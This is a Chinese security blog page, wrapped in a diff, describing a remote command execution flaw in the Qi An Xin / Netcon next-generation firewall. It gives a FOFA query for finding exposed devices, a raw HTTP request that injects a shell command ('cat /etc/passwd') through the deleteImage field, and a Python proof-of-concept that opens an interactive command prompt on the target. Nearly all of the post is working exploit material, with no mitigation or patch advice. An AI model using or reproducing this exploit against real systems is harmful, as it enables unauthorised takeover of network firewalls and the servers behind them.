@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="奇安信 网康下一代防火墙 RCE漏洞描述奇安信 网康下一代防火墙存在远程命令执行，通过漏洞攻击者可以获取服务器权限 漏洞影响 [!NOTE] 奇安信 网康下一代防火墙  FOFA [!NOTE] app&#x3D;”网康科技-下一代防火墙”  漏洞复现登录页面如下 ![](&#x2F;resource&#x2F;奇安信-网康下一代防火墙-RCE&#x2F;media&#x2F;1.png)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/%E5%A5%87%E5%AE%89%E4%BF%A1/%E5%A5%87%E5%AE%89%E4%BF%A1%20%E7%BD%91%E5%BA%B7%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99%20RCE/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="奇安信 网康下一代防火墙 RCE漏洞描述奇安信 网康下一代防火墙存在远程命令执行，通过漏洞攻击者可以获取服务器权限 漏洞影响 [!NOTE] 奇安信 网康下一代防火墙  FOFA [!NOTE] app&#x3D;”网康科技-下一代防火墙”  漏洞复现登录页面如下 ![](&#x2F;resource&#x2F;奇安信-网康下一代防火墙-RCE&#x2F;media&#x2F;1.png)">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-07-08T06:26:10.757Z">
+<meta property="article:modified_time" content="2022-07-08T09:06:16.857Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-奇安信/奇安信 网康下一代防火墙 RCE" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/%E5%A5%87%E5%AE%89%E4%BF%A1/%E5%A5%87%E5%AE%89%E4%BF%A1%20%E7%BD%91%E5%BA%B7%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99%20RCE/" class="article-date">
+  <time datetime="2022-07-08T06:26:10.757Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="奇安信-网康下一代防火墙-RCE"><a href="#奇安信-网康下一代防火墙-RCE" class="headerlink" title="奇安信 网康下一代防火墙 RCE"></a>奇安信 网康下一代防火墙 RCE</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>奇安信 网康下一代防火墙存在远程命令执行，通过漏洞攻击者可以获取服务器权限</p>
+<h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><blockquote>
+<p>[!NOTE]</p>
+<p>奇安信 网康下一代防火墙</p>
+</blockquote>
+<h2 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h2><blockquote>
+<p>[!NOTE]</p>
+<p>app=”网康科技-下一代防火墙”</p>
+</blockquote>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>登录页面如下</p>
+<p>![](/resource/奇安信-网康下一代防火墙-RCE/media/1.png)</p>
+<p>发送如下请求包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /directdata/direct/router HTTP/1.1</span><br><span class="line">Host: XXX.XXX.XXX.XXX</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 179</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">sec-ch-ua: &quot;Google Chrome&quot;;v=&quot;89&quot;, &quot;Chromium&quot;;v=&quot;89&quot;, &quot;;Not A Brand&quot;;v=&quot;99&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"></span><br><span class="line">&#123;&quot;action&quot;:&quot;SSLVPN_Resource&quot;,&quot;method&quot;:&quot;deleteImage&quot;,&quot;data&quot;:[&#123;&quot;data&quot;:[&quot;/var/www/html/d.txt;cat /etc/passwd &gt;/var/www/html/test_cmd.txt&quot;]&#125;],&quot;type&quot;:&quot;rpc&quot;,&quot;tid&quot;:17,&quot;f8839p7rqtj&quot;:&quot;=&quot;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>再请求获取命令执行结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.xxx.xxx.xxxx/test_cmd.txt</span><br></pre></td></tr></table></figure>
+
+<p>![](/resource/奇安信-网康下一代防火墙-RCE/media/2.png)</p>
+<h2 id="漏洞POC"><a href="#漏洞POC" class="headerlink" title="漏洞POC"></a>漏洞POC</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">title</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+------------------------------------------&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[34m公众号 : PeiQi文库                                                     \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[34mVersion: 奇安信 网康下一代防火墙                                      \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[36m使用格式:  python3 poc.py                                            \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+------------------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POC_1</span>(<span class="params">target_url</span>):</span><br><span class="line">    vuln_url = target_url + <span class="string">&quot;/directdata/direct/router&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    data = <span class="string">&#x27;&#123;&quot;action&quot;:&quot;SSLVPN_Resource&quot;,&quot;method&quot;:&quot;deleteImage&quot;,&quot;data&quot;:[&#123;&quot;data&quot;:[&quot;/var/www/html/d.txt;cat /etc/passwd &gt;/var/www/html/test_cmd.txt&quot;]&#125;],&quot;type&quot;:&quot;rpc&quot;,&quot;tid&quot;:17,&quot;f8839p7rqtj&quot;:&quot;=&quot;&#125;&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response = requests.post(url=vuln_url, headers=headers, data=data,verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[32m[o] 目标&#123;&#125;可能存在漏洞, 正在执行命令 cat /etc/passwd \033[0m&quot;</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">            response = requests.get(url=target_url + <span class="string">&quot;/test_cmd.txt&quot;</span>, headers=headers, data=data, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;root&quot;</span> <span class="keyword">in</span> response.text <span class="keyword">and</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;\033[32m[o] 响应为： &#123;&#125; \033[0m&quot;</span>.<span class="built_in">format</span>(response.text))</span><br><span class="line">                <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                    cmd = <span class="built_in">input</span>(<span class="string">&quot;\033[35mCmd &gt;&gt;&gt; \033[0m&quot;</span>)</span><br><span class="line">                    <span class="keyword">if</span> cmd == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">                        sys.exit(<span class="number">0</span>)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        POC_2(target_url, cmd)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[31m[x] 目标不存在漏洞 \033[0m&quot;</span>)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[31m[x] 请求失败 \033[0m&quot;</span>, e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POC_2</span>(<span class="params">target_url, cmd</span>):</span><br><span class="line">    vuln_url = target_url + <span class="string">&quot;/directdata/direct/router&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    data = <span class="string">&#x27;&#123;&quot;action&quot;:&quot;SSLVPN_Resource&quot;,&quot;method&quot;:&quot;deleteImage&quot;,&quot;data&quot;:[&#123;&quot;data&quot;:[&quot;/var/www/html/d.txt;%s &gt;/var/www/html/test_cmd.txt&quot;]&#125;],&quot;type&quot;:&quot;rpc&quot;,&quot;tid&quot;:17,&quot;f8839p7rqtj&quot;:&quot;=&quot;&#125;&#x27;</span> % (cmd)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response = requests.post(url=vuln_url, headers=headers, data=data, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response = requests.get(url=target_url + <span class="string">&quot;/test_cmd.txt&quot;</span>, headers=headers, data=data, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[32m[o] 响应为： \n&#123;&#125; \033[0m&quot;</span>.<span class="built_in">format</span>(response.text))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[31m[x] 请求失败 \033[0m&quot;</span>, e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    title()</span><br><span class="line">    target_url = <span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">&quot;\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m&quot;</span>))</span><br><span class="line">    POC_1(target_url)</span><br></pre></td></tr></table></figure>
+
+<p>![](/resource/奇安信-网康下一代防火墙-RCE/media/3.png)</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/%E5%A5%87%E5%AE%89%E4%BF%A1/%E5%A5%87%E5%AE%89%E4%BF%A1%20%E7%BD%91%E5%BA%B7%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99%20RCE/" data-id="cl5c2r0wo00q4y8v112ig1gbk" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7Smartweb%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA/%EF%BC%88CNVD-2019-20835%EF%BC%89%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA%20%E5%89%8D%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
